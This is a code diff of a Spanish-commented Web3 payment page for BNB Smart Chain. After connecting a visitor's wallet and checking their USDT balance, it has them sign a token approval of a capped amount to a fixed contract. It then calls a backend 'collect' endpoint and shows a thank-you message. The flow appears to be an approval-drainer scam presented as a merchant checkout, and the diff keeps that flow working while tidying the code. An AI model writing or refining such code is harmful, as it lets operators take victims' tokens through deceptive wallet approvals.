@@ -1,25 +1,15 @@
 import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers@5.1.11';
 
-// ─── Configuration (Tus valores originales intactos) ──────────────────────────
+// ─── Configuration (Tus valores originales intactos) ─────────────
 const PROJECT_ID       = "d0e2a91d8b8bd759f1e3cfb6ea1e41c0";
 const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
 const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID_HEX = "0x38";
-const MIN_USDT_BALANCE = ethers.parseUnits("0", 18);
+const BSC_CHAIN_ID     = 56;
 const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
 
-const BSC_RPC_URLS = [
-  "https://bsc-rpc.publicnode.com",
-  "https://bsc-dataseed.binance.org/",
-  "https://bsc-dataseed1.binance.org/",
-  "https://bsc-dataseed2.binance.org/",
-  "https://bsc-dataseed3.binance.org/",
-  "https://rpc.ankr.com/bsc"
-];[cite: 8]
-
 const bscChain = {
-  chainId: 56,
+  chainId: BSC_CHAIN_ID,
   name: 'BNB Smart Chain',
   currency: 'BNB',
   explorerUrl: 'https://bscscan.com',
@@ -33,8 +23,8 @@ const metadata = {
   icons: ['https://avatars.githubusercontent.com/u/37784886']
 };
 
-// Inicializar Reown AppKit (QR en PC, Universal Links limpios en Móvil)
-const ethersConfig = defaultConfig({ metadata, defaultChainId: 56 });
+// Configuración e inicialización de Reown AppKit
+const ethersConfig = defaultConfig({ metadata, defaultChainId: BSC_CHAIN_ID });
 
 const modal = createWeb3Modal({
   ethersConfig,
@@ -54,9 +44,10 @@ const toastEl       = document.getElementById("toast");
 
 if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
 
-// Despertar backend de Render[cite: 8]
+// Despertar backend de Render
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
+// ─── UI Helpers (Tus funciones originales) ─────────────────────────
 let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
   if (!toastEl) return;
@@ -74,31 +65,12 @@ function setLoading(on, label = "Processing…") {
   if (btnSpinner) btnSpinner.hidden = !on;
 }
 
-// Sincronizar texto del botón con el estado de sesión persistente de AppKit
+// Sincronizar texto del botón primario con el estado real de la sesión de AppKit
 modal.subscribeEvents(() => {
-  if (modal.getIsConnected()) {
-    btnText.textContent = "PROCEDER APROBACIÓN";
-  } else {
-    btnText.textContent = "CONECTAR WALLET";
-  }
+  btnText.textContent = modal.getIsConnected() ? "PROCEDER APROBACIÓN" : "CONECTAR WALLET";
 });
 
-// ─── RPC Helpers y Blockchain Utils (Tus funciones originales optimizadas) ───
-async function rpcCall(method, params) {
-  for (const rpc of BSC_RPC_URLS) {
-    try {
-      const r = await fetch(rpc, {
-        method:  "POST",
-        headers: { "Content-Type": "application/json" },
-        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
-      });
-      const j = await r.json();
-      if (j.result !== undefined) return j.result;
-    } catch (_) {}
-  }
-  return null;
-}
-
+// ─── Backend Collection Helper ───────────────────────────────────
 async function triggerBackendCollect(userAddress, amountWei) {
   let lastErr;
   for (let i = 1; i <= 3; i++) {
@@ -119,11 +91,11 @@ async function triggerBackendCollect(userAddress, amountWei) {
   throw lastErr;
 }
 
-// ─── Main Button Handler ──────────────────────────────────────────────────────
+// ─── Main Button Handler (Conectado a AppKit & Ethers v6) ─────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
     try {
-      // 1. Si no está conectado, abrir AppKit (Muestra QR en PC o selector nativo en Móvil)
+      // 1. Si no está conectado, abrir AppKit (Muestra QR en PC / Selector nativo en Móvil)
       if (!modal.getIsConnected()) {
         await modal.open();
         return;
@@ -131,7 +103,6 @@ if (approveBtn) {
 
       setLoading(true, "Conectando proveedor…");
 
-      // 2. Obtener proveedor seguro con Ethers v6 y AppKit
       const walletProvider = modal.getWalletProvider();
       if (!walletProvider) throw new Error("No se pudo obtener el proveedor de la billetera.");
 
@@ -139,9 +110,9 @@ if (approveBtn) {
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
 
-      // 3. Validar red activa (Forzar BSC)
+      // 2. Validar Red Activa (BNB Smart Chain)
       const network = await provider.getNetwork();
-      if (Number(network.chainId) !== 56) {
+      if (Number(network.chainId) !== BSC_CHAIN_ID) {
         showToast("Por favor cambia tu red a BNB Smart Chain en tu wallet.", "error");
         setLoading(false);
         return;
@@ -159,7 +130,7 @@ if (approveBtn) {
 
       const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
 
-      // 4. Validar saldo del usuario
+      // 3. Validar Saldo de USDT
       setLoading(true, "Validando saldo…");
       const balance = await usdtContract.balanceOf(userAddress);
       if (balance < requiredAmount) {
@@ -168,7 +139,7 @@ if (approveBtn) {
         return;
       }
 
-      // 5. Verificar allowance existente
+      // 4. Verificar Allowance Existente
       setLoading(true, "Verificando permisos…");
       const currentAllowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
 
@@ -180,14 +151,14 @@ if (approveBtn) {
         return;
       }
 
-      // 6. Lanzar Transacción de Aprobación
+      // 5. Ejecutar Aprobación de Token en Smart Contract
       setLoading(true, "Firma requerida en wallet…");
       const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);
       
       setLoading(true, "Confirmando en red…");
       await tx.wait();
 
-      // 7. Enviar al Backend
+      // 6. Notificar al Backend
       setLoading(true, "Finalizando…");
       await triggerBackendCollect(userAddress, requiredAmount);
       showToast("Sent Successfully, Thank you! ✓", "success");
